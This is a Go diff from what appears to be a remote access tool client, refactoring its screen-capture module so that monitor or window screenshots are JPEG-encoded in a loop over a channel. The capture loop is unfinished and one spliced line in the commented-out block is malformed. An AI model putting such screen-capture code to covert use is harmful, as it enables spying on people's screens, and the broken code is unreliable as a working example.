@@ -4,55 +4,43 @@ import (
 	"bytes"
 	"image"
 	"image/jpeg"
-	"os"
+	"io"
 	"rat/client/screen"
-	"rat/shared/network/header"
-
-	"github.com/disintegration/imaging"
-	"gopkg.in/mgo.v2/bson"
 )
 
-var screenStream bool
-var monitor bool
-var handle int
-var scale float32
-
-type RecvScreenPacket struct {
+type ScreenChannel struct {
 	Active  bool
 	Scale   float32
 	Monitor bool
 	Handle  int
 }
 
-func (packet RecvScreenPacket) Header() header.PacketHeader {
-	return header.ScreenHeader
-}
+func (sc ScreenChannel) Open(channel io.ReadWriteCloser, c *Connection) error {
+	monitor := screen.Monitors[sc.Handle]
 
-type SendScreenPacket struct {
-	Buffer []byte "buffer"
-	Width  int
-	Height int
-}
+	var err error
 
-func (packet SendScreenPacket) Header() header.PacketHeader {
-	return header.ScreenHeader
-}
+	for err == nil {
+		var capture image.Image
+		if sc.Monitor {
+			capture = screen.Capture(monitor)
+		} else {
+			capture = screen.CaptureWindow(sc.Handle)
+		}
 
-func (packet RecvScreenPacket) OnReceive() error {
-	if packet.Active && !screenStream {
-		// Dispatch one screen packet
-		Queue <- &SendScreenPacket{}
+		rgba := capture.(*image.RGBA)
+
+		var buf bytes.Buffer
+
+		jpeg.Encode(&buf, rgba, &jpeg.Options{
+			Quality: 75,
+		})
 	}
 
-	screenStream = packet.Active
-	monitor = packet.Monitor
-	handle = packet.Handle
-	scale = packet.Scale
-
-	return nil
+	return err
 }
 
-func (packet *SendScreenPacket) Init() {
+/* func (packet *SendScreenPacket) Init() {
 	screen.QueryMonitors()
 
 	var w bytes.Buffer
@@ -60,7 +48,8 @@ func (packet *SendScreenPacket) Init() {
 	var img image.Image
 	if true {
 		// Read image from file that already exists
-		existingImageFile, err := os.Open("mock_scrot.png")
+		existingImageFile, err := os.	fmt.Println("channel open")
+Open("mock_scrot.png")
 		if err != nil {
 			// Handle error
 		}
@@ -105,8 +94,4 @@ func (packet *SendScreenPacket) Init() {
 		}()
 	}
 }
-
-func (packet RecvScreenPacket) Decode(buf []byte) (IncomingPacket, error) {
-	err := bson.Unmarshal(buf, &packet)
-	return packet, err
-}
+*/
